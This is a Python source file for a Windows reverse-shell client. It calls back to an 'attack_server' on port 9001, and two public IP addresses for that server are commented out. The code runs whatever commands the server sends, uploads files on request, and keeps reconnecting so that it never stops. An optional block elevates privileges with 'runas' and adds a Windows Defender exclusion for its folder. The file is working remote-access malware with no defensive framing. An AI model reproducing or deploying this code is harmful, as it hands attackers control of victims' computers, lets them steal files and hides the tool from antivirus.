import os,socket,subprocess
import time,sys
import win32com.shell.shell as shell

DEBUG=True
UAC_BYPASS=False
port = 9001  #port of attack_server
host_addr = "127.0.0.1" 
#host_addr = "175.192.214.36" #address of attack_server
#host_addr = "15.164.224.216" #address of attack_server


### UAC to get Admins

def debug_print(str):
    if(DEBUG):
        print(str)

def debug_pause():
    if(DEBUG):
        os.system('pause')


def send_and_recv(conn_param,message): # socket send safe function. if send empty buffer, server cannot get. so should be altered
    BUFFER_SIZE=10000
    if(message==''):
        print("null message error...") #빈 패킷을 보내지않도록 처리
        return 0
    conn_param.send(message.encode())
    print("wait for host message...")
    recved = conn_param.recv(BUFFER_SIZE).decode()
    print(recved)
    return recved

def send_s(conn_param,message): # safe send socket. restrict null message
    BUFFER_SIZE=10000
    if(message==''):
        print("null message error...") #빈 패킷을 보내지않도록 처리
        return 0
    try:
        conn_param.send(message.encode('utf-8'))
    except Exception as e:
        debug_print(e)
        conn_param.send(message.encode('cp949'))

def file_send(conn_param,file_path_param):
    try:
        with open(file_path_param,'rb') as f:
            debug_print(f"file opened")
            file_content = f.read()
            file_name = file_path_param.split('\\')[-1]
            file_size = len(file_content)
            send_s(conn_param,f'fileinfo:{file_name}:{file_size}')
            debug_print(f"file_info sended : fileinfo {file_name} {file_size}")
            conn_param.sendall(file_content)
            debug_print(f"file_content sended")
    except Exception as e:
        debug_print(e) # ex) no file exception
        send_s(conn_param,"file open failed")

def file_exist_check(file_path_param):
    debug_print(f"file found... : {file_path_param}")


def file_transfer_mode(conn_param):
    debug_print("file transfer mode ON...")
    filename_cmd = send_and_recv(conn_param,"client : i am is ready to send file!")
    debug_print(f"filename_cmd : {filename_cmd}")

    if(filename_cmd=="exit"):
        debug_print("file transfer mode OFF...") # file_transfer_mode OFF
        send_s(conn_param,"exit")
        return 0
    else:
        try:
            get_dir=os.getcwd()
            file_path = os.path.join(get_dir,filename_cmd)
            if(os.path.isfile(file_path)):
                file_send(conn_param,file_path)
                send_s(conn_param,get_dir)
                return 0
            else:
                send_s(conn_param,f"error: no file exists named {filename_cmd}...")
                return 0
        except Exception as e:
            send_s(conn_param,f"error:{e}")
            return 0
    


  

debug_print("hello debug!")
if(UAC_BYPASS):
    if sys.argv[-1] != 'asadmin':
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script]+sys.argv[1:]+['asadmin'])
        shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
        sys.exit(0)

    script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
    subprocess.call(script,shell=True) #다른프로세스로 실행되기때문에, vscode 또는 cmd 출력을 사용할 수 없습니다.
#os.system("pause")

#### payload



debug_print("client start...")


while True:
    try:
        # try to connect to host
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
            conn.connect((host_addr, port))
            debug_print(f"connected to {host_addr},{port}")

            ## Socket Connected loop start ##

            while True:
                # recv server command
                debug_print("wait for server message...")
                server_cmd = conn.recv(10000).decode()
                debug_print(f"command recv success!! : {server_cmd}") #recv success
                
                # if recved command, if command is special, handle wheather its special command

                # special command Handler
                if(server_cmd[:2]=="cd"): # cd makes shell change... so it required to handled as special command
                    os.chdir(str(server_cmd[3:]))
                    output=os.getcwd()
                    send_s(conn,output)
                elif(server_cmd[:2]=="ls"): # alter mojibake hangul
                    dir_list=os.listdir(os.getcwd())
                    send_s(conn,'\n'.join(dir_list))
                elif(server_cmd[:2]=="ft"):
                    if(file_transfer_mode(conn)==0):
                        continue
                elif(server_cmd[:4]=="term"):
                    os._exit(0)
                else:
                    # no special command Handler
                    output=subprocess.getoutput(server_cmd)
                    debug_print(f"output: /{output}/")
                    send_s(conn,output) # send terminal output to server
                    debug_print("output sended to server...")

            ## Socket Connected loop end ##

    # try to connect to host // failed, infinite loop
    except Exception as e:
        debug_print(e)
        pass #네트워크 에러면 재시도하고, 다른 모든 에러는 모두 pass해서 절대 꺼지지않도록 함.
        


